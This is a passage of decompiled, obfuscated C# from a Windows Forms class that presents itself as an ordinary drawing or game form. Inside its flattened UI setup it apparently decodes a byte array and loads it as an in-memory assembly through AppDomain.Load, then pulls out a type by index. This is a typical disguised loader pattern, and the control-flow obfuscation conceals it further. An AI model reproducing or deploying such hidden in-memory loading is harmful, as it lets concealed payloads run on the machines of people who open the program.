						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -250967129) ^ -1402915928;
					continue;
				case 13u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -2061039100) ^ 0x2DD86B56;
					continue;
				case 12u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = (int)(num2 * 2122006044) ^ -286547981;
					continue;
				case 11u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -1513911621) ^ -1931944703;
					continue;
				case 10u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 1815179435) ^ -24974945;
					continue;
				case 9u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1650337141) ^ 0x41ADFB32;
					continue;
				case 8u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -985308422) ^ 0x3A49A07;
					continue;
				case 7u:
					num = ((int)num2 * -994329909) ^ -1197860847;
					continue;
				case 6u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 1128446840) ^ 0x3FAD2A68);
					continue;
				case 5u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1236477023) ^ -1176678379;
					continue;
				case 4u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)((num2 * 1796167141) ^ 0x217CD038);
					continue;
				case 3u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -140139010) ^ -1061894033;
					continue;
				case 2u:
					num = ((int)num2 * -1898887952) ^ -561601797;
					continue;
				case 1u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -5221153) ^ -1361800630;
					continue;
				case 0u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 1712109019) ^ -1239807898;
					continue;
				default:
					return;
				case 94u:
					break;
				case 105u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = 1649749757;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1B55560Au) % 3u)
				{
				case 2u:
					goto IL_0009;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = (int)(num2 * 1454541095) ^ -456146674;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 1732110719;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3D30C0BCu) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)(num2 * 1896901426) ^ -1100494636;
					continue;
				case 2u:
					num = (int)(num2 * 1141942727) ^ -1100388233;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
